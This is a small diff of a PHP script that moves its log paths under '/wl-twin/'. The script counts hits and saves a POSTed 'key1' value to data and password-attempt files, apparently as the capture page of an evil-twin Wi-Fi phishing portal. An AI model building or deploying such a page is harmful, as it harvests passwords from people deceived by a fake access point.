@@ -1,7 +1,7 @@
 <?php
 error_reporting(0);
 
-$count_my_page = ("/log/hit.txt");
+$count_my_page = ("/wl-twin/log/hit.txt");
 $hits = file($count_my_page);
 $hits[0] ++;
 $fp = fopen($count_my_page , "w");
@@ -12,10 +12,10 @@ fclose($fp);
 $key1 = @$_POST['key1'];
 
 // Write the name of text file where data will be store
-$filename = "/log/data.txt";
-$filename2 = "/log/status.txt";
-$intento = "/log/intento";
-$attemptlog = "/log/pwattempt.txt";
+$filename = "/wl-twin/log/data.txt";
+$filename2 = "/wl-twin/log/status.txt";
+$intento = "/wl-twin/log/intento";
+$attemptlog = "/wl-twin/log/pwattempt.txt";
 
 // Marge all the variables with text in a single variable.
 $f_data= ''.$key1.'';
